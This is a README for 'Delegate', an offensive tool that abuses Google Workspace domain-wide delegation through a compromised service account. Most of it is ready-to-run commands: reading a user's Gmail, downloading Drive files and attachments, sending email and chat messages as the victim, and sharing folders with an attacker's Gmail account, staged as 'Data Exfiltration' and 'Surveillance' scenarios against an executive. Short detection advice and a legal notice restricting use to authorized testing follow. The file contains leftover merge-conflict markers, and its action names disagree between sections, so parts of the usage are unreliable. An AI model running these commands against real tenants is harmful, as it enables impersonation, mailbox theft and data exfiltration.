# Delegate
Tool to perform GCP Domain Wide Delegation abuse and access Gmail, Drive and Chat data from a compromised Service Account with domain wide delegation permissions configured within Google Workspace.

- [Domain Wide Delegation article](https://medium.com/@lutzenfried/gcp-domain-wide-delegation-abuses-b82b8dd8cf15)

<img src="./Images/DomainWideDelegation_GCP.png" alt="gcpdelegation" width="800"/>

## Delegate tool usage
### Gmail usage
List all Gmail emails (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a list
```

Read Gmail emails (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read
```

List Gmail folders (Labels)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a folders
```

Download all attachments within the targeted Gmail (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a attachments
```

Read all emails within specified folder (Labels) (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read -f DRAFT
```

Send an email as targeted.delegated@mackinsoncloud.com to jdoe@gmail.com specifying subject and body email content
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a send -r jdoe@gmail.com -s "Test Messaage subject" -c "Hello this is a test email"
```

### Drive usage

List all files and folders within the targeted Drive account
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a list
```

List all folders content within the targeted Drive account
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a folders
```

Download locally a specific file secret.txt
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a download -t secret.txt
```

Upload files at user's Drive root folder (My Drive)
```
python3 delegate.py -k <serviceaccount_key> -m drive -a upload -i <targeted_Workspace_user> -t <localfile> -p <NameInDrive>
python3 delegate.py -k ../sa_key.json -m drive -a upload -i targeted.delegated@mackinsoncloud.com -t test.txt -p uploadedTest.txt
```

Upload files within specific user's Drive folder or organizational Shared Drive
```
python3 delegate.py -k <serviceaccount_key> -m drive -a upload -i <targeted_Workspace_user> -t <localfile> -p <NameInDrive> -f <DriveFolder>
python3 delegate.py -k ../sa_key.json -m drive -a upload -i targeted.delegated@mackinsoncloud.com -t test.txt -p uploadedTest.txt -f Restricted_documents
```

Modify permissions on specific folder (Add external Gmail account with Writer permissions over the file/folder)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a permissions -t Restricted_documents -e attackeremail@gmail.com
```

Modify permissions on specific file (Add external Gmail account with Writer permissions over the file/folder)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a permissions -t secrets.txt -e attackeremail@gmail.com
```
<<<<<<< HEAD
=======

#### List Messages in Space
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a listMessages \
  --space-id "AAAAAbCdEfG" \
  --max-results 100
```

#### Read Full Message Content
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a readMessages \
  --space-id "AAAAAbCdEfG" \
  --max-results 50
```

#### Send Message
```bash
# Simple message
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "AAAAAbCdEfG" \
  --text "Hello team!"

# Reply to thread
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "AAAAAbCdEfG" \
  --text "Replying to this thread" \
  --thread-id "xyz123abc"
```

#### Send Message with Attachment
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendWithAttachment \
  --space-id "AAAAAbCdEfG" \
  --text "Please review this document" \
  --filepath "/path/to/document.pdf"

# With thread
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendWithAttachment \
  --space-id "AAAAAbCdEfG" \
  --text "Updated version attached" \
  --filepath "/path/to/file.xlsx" \
  --thread-id "xyz123abc"
```

#### Download Attachments
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a downloadAttachments \
  --space-id "AAAAAbCdEfG" \
  --max-results 100
```

**Note:** Creates a `chat_attachments_<SPACE_ID>` directory with all downloaded files.

#### Get Space Members
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a getMembers \
  --space-id "AAAAAbCdEfG"
```

#### Create New Space
```bash
# Basic space
python delegate.py -k sa_key.json -i victim@company.com -m chat -a createSpace \
  --summary "Project Alpha"

# Space with description and threading
python delegate.py -k sa_key.json -i victim@company.com -m chat -a createSpace \
  --summary "Security Team" \
  --description "Internal security discussions" \
  --threaded
```

---

## 🎯 Common Scenarios

### Scenario 1: Complete Email Reconnaissance

```bash
# Step 1: List all folders
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a listFolders

# Step 2: List emails from INBOX
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a listFromLabel --label "INBOX"

# Step 3: Read email contents
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a read

# Step 4: Download all attachments
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a downloadAttachments
```

### Scenario 2: Drive Data Exfiltration

```bash
# Step 1: List all files
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFolders

# Step 2: Download sensitive files
python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Q4_Financial_Report.xlsx"

python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Customer_Database.csv"

# Step 3: Share with external account
python delegate.py -k sa_key.json -i victim@company.com -m drive -a modifyPermissions \
  --filename "Q4_Financial_Report.xlsx" \
  --external-account "attacker@gmail.com"
```

### Scenario 4: Chat Space Surveillance

```bash
# Step 1: List all spaces
python delegate.py -k sa_key.json -i user@company.com -m chat -a listSpaces

# Step 2: Get space members
python delegate.py -k sa_key.json -i user@company.com -m chat -a getMembers \
  --space-id "SPACE_ID_HERE"

# Step 3: Read messages
python delegate.py -k sa_key.json -i user@company.com -m chat -a readMessages \
  --space-id "SPACE_ID_HERE" \
  --max-results 200

# Step 4: Download attachments
python delegate.py -k sa_key.json -i user@company.com -m chat -a downloadAttachments \
  --space-id "SPACE_ID_HERE"
```

---

## 🔧 PowerShell Shortcuts

### Batch Operations

```powershell
# Test multiple users
$users = @("user1@company.com", "user2@company.com", "user3@company.com")

foreach ($user in $users) {
    Write-Host "[*] Testing: $user" -ForegroundColor Cyan
    python .\delegate.py -k $KEY -i $user -m gmail -a listFolders
}
```

---

## 🛡️ Security Notes

### Domain-Wide Delegation Setup

For this tool to work, the service account must have domain-wide delegation configured in **Google Workspace Admin Console**:

1. Go to **Security** → **API Controls** → **Domain-wide Delegation**
2. Add the service account's **Client ID**
3. Authorize these OAuth scopes:
   ```
   https://mail.google.com/
   https://www.googleapis.com/auth/drive
   https://www.googleapis.com/auth/chat.spaces
   ```

### Detection & Prevention

**Detection:**
- Monitor Google Workspace audit logs for service account activity
- Alert on API calls from unusual IPs
- Track file sharing to external domains
- Monitor bulk downloads

**Prevention:**
- Limit domain-wide delegation scopes
- Regularly audit service account permissions
- Implement IP restrictions
- Enable advanced protection for high-risk users
- Use context-aware access policies

---

## ⚠️ Legal Notice

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ Security research in lab environments
- ✅ Red team exercises with permission
- ✅ Security awareness training

**Never use without explicit written authorization!**

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws worldwide

---

## 📚 Additional Resources

- **GitHub**: https://github.com/lutzenfried/Delegate
- **Blog Post**: https://medium.com/@lutzenfried/gcp-domain-wide-delegation-abuses
- **Google Docs**: https://developers.google.com/identity/protocols/oauth2/service-account

---

## 🎓 Quick Reference Card

| Module | Most Common Actions |
|--------|-------------------|
| **Gmail** | `list`, `read`, `downloadAttachments` |
| **Drive** | `listFolders`, `download`, `modifyPermissions` |
| **Chat** | `listSpaces`, `readMessages`, `downloadAttachments` |

---

**Version 3.0.0** | Last Updated: 2025-10-16 | Author: @lutzenfried
>>>>>>> d17f22b05718048d79438fb720ca7dddb749cd66
